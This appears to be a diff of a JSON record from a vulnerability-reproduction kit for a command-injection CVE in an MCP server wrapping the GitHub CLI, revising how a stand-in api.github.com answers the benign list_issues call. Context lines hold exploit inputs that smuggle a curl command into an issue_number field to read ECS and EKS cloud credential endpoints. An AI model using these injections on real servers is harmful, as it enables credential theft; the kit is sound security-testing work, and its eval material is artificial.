@@ -146783,14 +146783,14 @@
           {
             "stand_in": {
               "replaces": "api.github.com, the GitHub GraphQL/REST API that the real gh contacts (the server does not call it directly; gh does)",
-              "reason": "The real gh runs in the container, but api.github.com cannot run in the closed fixture network, so it is served by a stand-in under its real name (leaf from the fixture authority, trusted via SSL_CERT_FILE; see launch_options). The CVE lives in the server's own execAsync shell string, which /bin/sh interprets before any gh process, so the stand-in takes no part in the injection; the exploits reach gh only through its help output and never contact api.github.com. Only the benign list_issues call drives gh against the stand-in: it sends one GraphQL IssueList query, which the single POST /graphql route answers with an empty issue set for the issue-less repo, so gh prints `[]` and the tool returns is_error=False on both builds. The stand-in has one route; any other GraphQL operation (the other tools, not exercised in the kit) receives the same body, which is the kit's single-route limitation, not a success gh's api would return for them.",
+              "reason": "The real gh runs in the container, but api.github.com cannot run in the closed fixture network, so it is served by a stand-in under its real name (leaf from the fixture authority, trusted via SSL_CERT_FILE; see launch_options). The CVE lives in the server's own execAsync shell string, which /bin/sh interprets before any gh process, so the stand-in takes no part in the injection; the exploits reach gh only through its help output and never contact api.github.com. Only the benign list_issues call drives gh against the stand-in: it sends one GraphQL IssueList query, which the capture's IssueList route answers with gh's own three-issue test fixture, so gh prints those issues and the tool returns is_error=False on both builds. The capture now carries one POST /graphql route per GraphQL operation the server's four tools send, keyed on the operation name; the operations the kit does not exercise have their own routes, and an unnamed operation falls back to the capture's documented 404 default.",
               "file": "evals/docker/Dockerfile.stand-in",
               "capture": "evals/stand_ins/api.github.com.json",
               "outputs": [
                 {
                   "request": "POST https://api.github.com/graphql, the GraphQL `query IssueList` gh 2.103.3 sends for `gh issue list --repo <owner/repo> --json number,title,state,labels,assignees,createdAt,updatedAt` (list_issues)",
                   "source": "software_sources",
-                  "citation": "GitHub GraphQL API reference, Repository.issues (IssueConnection): an issue-less repository returns totalCount 0 and an empty nodes list with a pageInfo of hasNextPage false / endCursor null. The query shape was read from the real gh 2.103.3 request (captured offline): `query IssueList(... $states: [IssueState!] = OPEN ...) { repository(owner,name) { hasIssuesEnabled issues(first,...) { totalCount nodes { ...issue } pageInfo { hasNextPage endCursor } } } }`.",
+                  "citation": "cli/cli v2.103.3 (commit 63837fb778d6a39f02be0ce76ff89f2bc8d74bdc) pkg/cmd/issue/list/fixtures/issueList.json, the fixture gh's IssueList tests serve, copied whole: three issues (titles 'number won', 'number too', 'number fore'). The query shape was read from the real gh 2.103.3 request (captured offline): `query IssueList(... $states: [IssueState!] = OPEN ...) { repository(owner,name) { hasIssuesEnabled issues(first,...) { totalCount nodes { ...issue } pageInfo { hasNextPage endCursor } } } }`.",
                   "form_source": null,
                   "replacements": []
                 }
@@ -146799,12 +146799,7 @@
             "returned_by": [
               "list_issues"
             ],
-            "used_by_default_by": [
-              "add_comment",
-              "list_issues",
-              "create_issue",
-              "update_issue"
-            ]
+            "used_by_default_by": []
           }
         ],
         "software_releases": [
@@ -146842,7 +146837,7 @@
           "add_comment(path=/repo, issue_number='--help; curl -s --max-time 5 http://169.254.170.2/v2/credentials/; :') -> ecs-task-credentials",
           "add_comment(path=/repo, issue_number='--help; curl -s --max-time 5 http://169.254.170.23/v1/credentials; :') -> eks-pod-identity"
         ],
-        "benign_call": "list_issues(path=/repo) -> the server resolves acme/kanban from /repo/.git/config and runs `gh issue list --repo acme/kanban --json number,title,state,labels,assignees,createdAt,updatedAt` once. The real gh sends one GraphQL IssueList query to the api.github.com stand-in, which returns an empty issue set for the issue-less repo, so the tool returns `[]` with is_error=False on both builds, surfaces no nonce and is not aimed. add_comment cannot be the benign call with the real gh: `gh issue comment` resolves the issue (IssueByNumber query, needs data.repository) and then runs the CommentCreate mutation (strict GraphQL decode, rejects the data.repository key), so a single static /graphql answer cannot satisfy one add_comment call, and the issue-less repo has no issue 1 to comment on.",
+        "benign_call": "list_issues(path=/repo) -> the server resolves acme/kanban from /repo/.git/config and runs `gh issue list --repo acme/kanban --json number,title,state,labels,assignees,createdAt,updatedAt` once. The real gh sends one GraphQL IssueList query to the api.github.com stand-in, which answers with gh's own three-issue test fixture, so the tool returns those three issues with is_error=False on both builds, surfaces no nonce and is not aimed. list_issues stays the benign call: its one IssueList query is the single GraphQL round trip a static capture answers cleanly, where add_comment drives gh through an issue lookup and a comment mutation on an issue the baked repo does not hold.",
         "patched_result": "On the patched build (commit 253d93b, released as the v0.4.1 tree): exec is replaced by execFile('gh', [...argv]) and handleAddComment validates issue_number against /^[1-9][0-9]*$/ before any gh call. Every exploit is rejected with McpError InvalidParams ('Issue番号は正の整数で指定してください。') before a process is spawned, so no nonce surfaces for any of the 23 kept places; the benign list_issues call still runs gh and returns is_error=False.",
         "attempts": 1
       },
